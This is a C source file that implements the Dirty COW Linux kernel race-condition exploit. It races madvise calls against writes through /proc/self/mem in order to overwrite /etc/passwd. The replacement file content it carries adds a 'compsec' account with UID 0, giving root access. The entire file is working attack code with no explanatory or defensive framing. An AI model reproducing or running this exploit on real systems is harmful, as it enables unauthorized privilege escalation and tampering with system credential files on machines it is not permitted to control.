#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void* map;
int f;
struct stat st;

char etc_passwd[] = "/etc/passwd";

char passwd[] = "root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
ntp:x:105:110::/home/ntp:/bin/false
whoopsie:x:106:114::/nonexistent:/bin/false
lightdm:x:107:115:Light Display Manager:/var/lib/lightdm:/bin/false
compsec:x:0000:1000:Compter Security,,,:/home/compsec:/bin/bash
";
 
void* madviseThread(void *arg)
{
  char *str = (char*)arg;
  int i,c=0;

  for(i=0;i<100000;i++)
    c+=madvise(map,100,MADV_DONTNEED);

  printf("madvise: Completed %d\n\n",c);
}
 
void* procselfmemThread(void *arg)
{
  char *str = (char*)arg;

  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;

  for(i=0;i<100000;i++) {
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }

  printf("/proc/self/mem: Completed %d\n\n", c);
}
 
 
int main(int argc,char *argv[])
{
  pthread_t pth1,pth2;


  f=open(etc_passwd,O_RDONLY);
  fstat(f,&st);

  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);


  pthread_create(&pth1,NULL,madviseThread, &etc_passwd);
  pthread_create(&pth2,NULL,procselfmemThread, &passwd);
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}